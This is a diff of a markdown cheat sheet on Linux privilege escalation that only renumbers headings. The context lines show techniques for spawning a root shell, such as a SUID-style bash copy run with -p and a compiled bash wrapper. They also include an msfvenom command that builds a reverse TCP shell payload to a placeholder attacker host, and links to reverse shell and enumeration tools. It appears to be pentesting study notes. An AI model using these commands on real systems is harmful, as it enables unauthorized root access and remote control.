@@ -1,12 +1,12 @@
-# Linux
+# Linux privilege escalation
 
-## Spawning root shell
+## 1 Spawning root shell
 
-### Rootbash
+### 1.1 Rootbash
 
 Create copy of `/bin/bash` as `/bin/rootbash` , then run `/bin/rootbash -p`
 
-### Executable
+### 1.2 Executable
 
 Create bash wrapper in c
 
@@ -23,7 +23,7 @@ Then, compile it as a root
 gcc -o <out_file> <source_code>
 ```
 
-### Msfvenom executable
+### 1.3 Msfvenom executable
 
 Create msfvenom payload, then execute as root.
 
@@ -31,13 +31,13 @@ Create msfvenom payload, then execute as root.
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
 ```
 
-### Native reverse shells
+### 1.4 Native reverse shells
 
 ```text
 https://github.com/mthbernardes/rsg
 ```
 
-## Enumeration tools
+## 2 Enumeration tools
 
 ```text
 https://github.com/diego-treitos/linux-smart-enumeration
